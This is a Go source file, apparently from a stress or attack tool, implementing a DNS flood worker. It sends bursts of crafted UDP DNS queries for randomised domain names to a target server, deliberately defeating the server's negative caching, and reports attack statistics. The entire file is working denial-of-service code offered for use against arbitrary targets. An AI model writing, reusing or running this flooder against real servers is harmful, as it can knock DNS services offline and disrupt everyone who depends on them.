package dns

import (
	"context"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
)

type floodWorker struct{}

func NewFloodWorker() *floodWorker { return &floodWorker{} }

// Fire sends a burst of crafted DNS A-record queries to the target DNS server.
// Default port is 53 when the target has no explicit port.
// Like udp_flood, raw UDP bypasses proxy routing.
func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()

	// When the user passes a bare host (e.g. "8.8.8.8") the parser assigns port 80.
	// Override to the DNS default in that case.
	if tn.Scheme == "" && port == 80 {
		port = 53
	}
	if host == "" || port <= 0 {
		return nil
	}

	address := net.JoinHostPort(host, strconv.Itoa(port))
	conn, err := net.DialTimeout("udp", address, 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	_ = conn.SetWriteDeadline(time.Now().Add(2 * time.Second))

	// Determine how many queries to send per Fire call.
	// PacketSize controls "volume": treat it as bytes-per-call capped to 10 queries.
	queryCount := params.PacketSize / 60 // ~60 bytes per typical DNS query
	if queryCount < 1 {
		queryCount = 1
	}
	if queryCount > 10 {
		queryCount = 10
	}

	for i := 0; i < queryCount; i++ {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		pkt := buildDNSQuery(randomDomain())
		_, _ = conn.Write(pkt)
	}
	return nil
}

// buildDNSQuery crafts a minimal RFC 1035 DNS query packet for an A record.
func buildDNSQuery(domain string) []byte {
	buf := make([]byte, 0, 64)

	// Header ─────────────────────────────────────────────────────────────────
	// Transaction ID (random 16-bit)
	txID := uint16(rand.Intn(0xFFFF))
	buf = append(buf, byte(txID>>8), byte(txID))

	// Flags: QR=0 (query), Opcode=0 (standard), RD=1 (recursion desired)
	buf = append(buf, 0x01, 0x00)

	// QDCOUNT = 1
	buf = append(buf, 0x00, 0x01)
	// ANCOUNT = 0
	buf = append(buf, 0x00, 0x00)
	// NSCOUNT = 0
	buf = append(buf, 0x00, 0x00)
	// ARCOUNT = 0
	buf = append(buf, 0x00, 0x00)

	// Question section ────────────────────────────────────────────────────────
	// QNAME: each label prefixed with its length, terminated by 0x00
	for _, label := range strings.Split(domain, ".") {
		if label == "" {
			continue
		}
		buf = append(buf, byte(len(label)))
		buf = append(buf, []byte(label)...)
	}
	buf = append(buf, 0x00) // root label terminator

	// QTYPE  = A (0x0001)
	buf = append(buf, 0x00, 0x01)
	// QCLASS = IN (0x0001)
	buf = append(buf, 0x00, 0x01)

	return buf
}

// randomDomain returns a plausible-looking random domain name so the server
// can't short-circuit with a cached NXDOMAIN.
func randomDomain() string {
	const alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
	tlds := []string{"com", "net", "org", "io", "co", "dev", "app"}

	length := 5 + rand.Intn(10)
	b := make([]byte, length)
	for i := range b {
		b[i] = alpha[rand.Intn(len(alpha))]
	}
	return string(b) + "." + tlds[rand.Intn(len(tlds))]
}
